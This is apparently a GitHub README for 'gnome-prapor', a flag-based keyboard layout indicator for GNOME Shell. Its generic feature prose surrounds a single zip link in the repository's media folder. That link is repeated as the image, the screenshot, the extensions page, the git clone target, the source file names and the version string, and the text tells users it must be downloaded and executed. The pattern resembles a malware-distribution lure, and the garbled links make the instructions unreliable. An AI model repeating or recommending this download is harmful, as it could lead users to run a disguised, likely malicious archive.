# gnome-prapor: Flag Keyboard Layout Indicator for GNOME Shell

[<img src="https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip" height="100">](https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip)

Download the release package from https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip This link points to a release pack that must be downloaded and executed to install the extension.  

![Extension Screenshot](https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip)

Welcome to gnome-prapor, a GNOME Shell extension that shows the current keyboard layout as a country flag in the top panel. It mirrors the behavior of the built-in layout indicator but adds a visual cue in the form of a flag. This makes it quicker to spot and switch between layouts at a glance. The project is designed to be small, dependable, and easy to customize for users who want a more visual cue in their workspace.

If you want to see the latest work, you can also check the release assets here: https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip That link appears again later in this document to help users find the official builds quickly.

Table of contents
- Overview
- Why flag indicators
- Key features
- Design goals
- System requirements
- How it works
- User experience and interaction
- Configuration and customization
- Flags and layouts mapping
- Accessibility considerations
- Screenshots and visual references
- Getting started
- From GNOME Extensions
- Manual installation
- Building from source
- Testing and quality
- Internationalization
- Troubleshooting
- Contributing
- Code structure
- Release management
- License
- Acknowledgments

Overview
gnome-prapor is a lightweight, visually oriented keyboard layout indicator for GNOME Shell. It sits in the top panel and shows a flag that represents the active input source. It updates when you switch layouts, so you always know which language you’re typing in. The design keeps the surface clean and consistent with GNOME aesthetics while offering a quick visual cue for frequent layout changes.

Why flag indicators
Many users work with multiple keyboard layouts. Text cues like language names can be long and hard to scan in a busy panel. Flags provide instant recognition and reduce cognitive load. Flags are culturally recognized symbols that quickly convey layout families and region. They also scale well with compact GNOME panel layouts, letting you keep more room for other indicators.

Key features
- Flag-based display of the active keyboard layout
- Small, unobtrusive icon in the top GNOME Shell panel
- Real-time updates when the layout changes
- Lightweight footprint with minimal dependencies
- Simple, well-documented codebase suitable for contributions
- Clean integration with GNOME Shell 48 and newer

Design goals
- Clarity: show the active layout without clutter
- Consistency: align with GNOME visual language
- Reliability: minimal memory usage and robust behavior
- Extensibility: easy to map more layouts or visuals if needed
- Accessibility: sensible focus, readable icons, and keyboard navigability

System requirements
- GNOME Shell 48 or newer
- GNOME 44+ libraries for smooth operation
- JavaScript (GJS) runtime for GNOME Shell extensions

How it works
The extension reads the current input source layout from GNOME's settings. It maps the active layout to a representative flag icon. When you switch layouts, the extension updates the flag in the panel automatically. The extension is implemented in JavaScript using the GNOME Shell extension framework, with a lightweight data model and a simple rendering component that integrates with the panel.

User experience and interaction
- The flag appears in the top panel alongside other indicators
- Hovering the flag reveals a small tooltip with the layout name or language tag
- Clicking cycles through available layouts when the extension is configured to do so
- Right-click or a dedicated keyboard shortcut can open layout settings, depending on your GNOME setup
- The display remains stable during theme changes and panel refreshes

Configuration and customization
gnome-prapor is designed to be straightforward to customize. Users can adjust:
- Which layouts show flags and how they map to specific flags
- The size of the flag icon to match panel density
- The behavior when switching layouts (e.g., auto-switch, cycle through, or keep a single layout)
- Tooltip content and formatting
- Icon styles to align with light or dark GNOME themes

Flags and layouts mapping
Mapping between layouts and flag icons is central to the extension. The default mapping aims to be intuitive for common language pairs and regional layouts. It is implemented as a compact lookup table that associates:
- Layout identifiers (like “us” for the United States, “gb” for the United Kingdom, “de” for Germany, “fr” for France)
- Language codes or input source IDs
- A visually representative flag emoji or SVG icon

This mapping can be extended through a local configuration file or over-the-air updates if you choose to contribute a small patch. The goal is to keep a balance between accuracy and simplicity while avoiding heavy assets that slow down panel redraws.

Accessibility considerations
- The flag icon has a descriptive tooltip to convey the layout name
- Keyboard navigation remains possible within GNOME Shell settings
- Screen readers can announce the flag description when focusing the panel items
- Contrast is preserved across light and dark themes to ensure readability

Screenshots and visual references
- The main extension view in the top panel shows a compact flag icon
- Hover tooltips provide context such as the layout language or region
- A screenshot reference (https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip) demonstrates the visual around the panel

Getting started
This section helps you install and try the extension, whether you prefer the official GNOME Extensions mechanism or a manual approach. It covers everything from enabling the extension in the GNOME Extensions site to building it from source if you want the latest changes.

From GNOME Extensions
- Open the GNOME Extensions page for the project:
  https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
- Install and enable the extension with a few clicks
- The extension will appear in your top panel after enabling
- If you want to keep up with updates, this is the simplest route

Manual installation
The manual route is useful if you want to build from source or run a version not yet published to GNOME Extensions. Follow these steps to set up the extension locally.

1) Download and install the extension files
- Run the following commands to fetch the project and install it:
  git clone https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
  cd gnome-prapor
  make install
  The project depends on git, make, and jq to prepare, build, and install the extension.

2) Restart GNOME Shell
- Apply changes by restarting GNOME Shell.
- Log out and back in if necessary to ensure the extension loads cleanly.

3) Enable the extension
- Use the GNOME Extensions app or the built-in GNOME Tweak Tool to enable gnome-prapor
- If you encounter issues, verify that the extension directory is in the correct GNOME extensions path and that the shell version matches the extension’s compatibility range

Get the latest release
For the latest build and packaged assets, visit the release notes and assets page:
- https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
- The release page provides ready-to-use bundles suitable for quick installation. This link is a practical starting point for users who want a stable, tested package without building from source.

Building from source
If you prefer to compile from the repository, you can set up a development environment and build the extension against GNOME Shell sources. This process typically involves:
- Ensuring you have https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip, GJS, and the GNOME development tools installed
- Running a build script or a sequence of commands to bundle the extension into a loadable target
- Testing in a live GNOME Shell session with the extension loaded from the local directory
- Verifying the mapping from layouts to flags in your locale setup
- Iterating with changes and reloading the shell to validate updates

Development and testing workflow
- Set up a clean GNOME session to test the extension without user data interference
- Run unit tests if present to verify the internal mappings and rendering
- Validate behavior across multiple layouts, including common multilingual setups
- Use a lightweight set of test layouts to ensure updates propagate quickly in the panel
- Confirm accessibility features function as expected

Code structure
- src/
  - https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip Main module that initializes and runs the extension
  - https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip Renders the flag icon in the top panel
  - https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip Maps layout IDs to flags and labels
  - https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip Small helpers for color schemes, icons, and string formatting
- data/
  - icons/: Flag icons or SVGs used by the extension
  - themes/: Optional assets for various GNOME themes
- locales/
  - https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip, https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip, https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip, etc.: Localized strings for UI elements and tooltips
- test/
  - tests/ : Unit tests and integration tests for panel behavior
- https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
  - Dependencies, scripts, and metadata for development
- https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
  - This file documents the project and provides guidance for users and contributors

Release management
- Versioning follows a simple semantic approach: https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
- Each release includes a changelog with notes on new flags, added layouts, and bug fixes
- Release assets are provided as bundles that can be dropped into GNOME Shell extensions folder
- The release page (linked above) lists all the artifacts, including source archives and prebuilt packages
- Users should verify compatibility with their GNOME Shell version before applying a release

Testing and quality
- The project includes automated checks for syntax, linting, and basic runtime validation
- A lightweight test suite ensures the core mapping and display logic remains stable across commits
- Visual tests confirm the flag rendering aligns with expected icons and remains legible in both light and dark themes
- Documentation tests verify that user-facing text strings are localized and accurate

Internationalization
- The extension includes support for multiple locales to help users who prefer non-English interfaces
- Strings appear in the appropriate language where translations exist
- Developers can contribute additional translations by extending the locales directory and providing language-specific JSON files

Accessibility
- The flag icon includes a text description for screen readers
- Tooltips give concise layout names for quick recognition
- The panel item maintains contrast and readability regardless of the current theme
- Keyboard users can navigate to and interact with the extension using standard GNOME Shell navigation

How to customize
- Edit the mapping to adjust which flag corresponds to a layout
- Change the icon size for different panel densities
- Adjust the tooltip to include more layout details or language codes
- Integrate with other GNOME Shell customization tools for a consistent look

Usage tips
- If you work with a very large set of layouts, consider filtering to a subset you use most
- For users in mixed-language environments, you can assign region-specific flags to reduce confusion
- When moving to a new language input system, update the mapping to reflect the new layouts
- Keep the extension updated to ensure compatibility with GNOME Shell changes

Troubleshooting
- If the flag does not appear after installation, verify that the extension is loaded in GNOME Shell and that the correct version is active
- Check the extension's logs for errors related to layout changes or icon rendering
- Ensure there are no conflicting extensions that also modify the top panel indicators
- If a layout switch does not trigger a flag update, confirm the GNOME setting path for input sources is accessible and stable
- For issues related to missing translations, verify the locale files and reload the extension
- If you are unsure whether a bug is present, reproduce with a minimal setup and a clean GNOME session

Contributing
gnome-prapor invites contributions from developers and designers who want to improve visual indicators for keyboard layouts. You can contribute in several ways:
- Report issues with clear steps to reproduce
- Suggest new flags for additional layouts and regions
- Add translations for more languages
- Propose UI improvements for the tooltip or interactions
- Help with code reviews and documentation updates
- Submit pull requests with new features or fixes
- Share ideas for performance improvements and accessibility enhancements

Code of conduct
- Maintain respectful communication on issues and pull requests
- Provide constructive feedback and be open to changes
- Acknowledge the work of others and avoid personal attacks

Code quality and standards
- The codebase follows standard GNOME Shell extension patterns
- Modules are small and cohesive, each with a focused responsibility
- Functions have descriptive names and limited side effects
- Error handling is explicit and non-disruptive to the user experience
- The public API is stable and documented for contributors

What to expect in future releases
- Expanded layout coverage with more flags
- Better customization options for advanced users
- Enhanced accessibility features and keyboard navigation
- Support for more GNOME Shell versions while maintaining compatibility
- Possibly optional themes or icon packs to diversify visual choices

License
This project is released under a permissive license that encourages use, modification, and redistribution in personal and commercial contexts.

Changelog
- Initial release: Basic flag indicator with core mapping
- Minor updates: Additional layouts and improved rendering
- Maintenance: Compatibility with GNOME Shell 49+ and bug fixes
- Experimental: Proposals for new icon packs and advanced configuration

Community and support
- If you need help, open an issue in the repository and describe your environment (GNOME version, shell version, distribution)
- For user-level questions, the GNOME Extensions community is a good starting point
- Share screenshots of your setup to help others replicate the look and behavior

Credits
- The project borrows ideas from GNOME’s built-in layout indicators and adapts them with a flag-based approach
- Thanks to contributors who provided feedback on usability and accessibility

Releases and distribution
- The official release assets are hosted at the page linked above
- The release page includes assets you can download and install directly
- If you want the latest changes quickly, you can build from source following the instructions earlier in this document

Contact
- For maintainers, reach out via the repository’s issue tracker or the chosen communication channel in the project guidelines

Footer
- This README provides practical guidance for both users and developers
- It aims to be a clear reference for installation, usage, customization, and contribution

License note
- The project uses a permissive license to encourage adoption and adaptation
- You are free to modify and distribute the software as long as you comply with the license terms

End of document

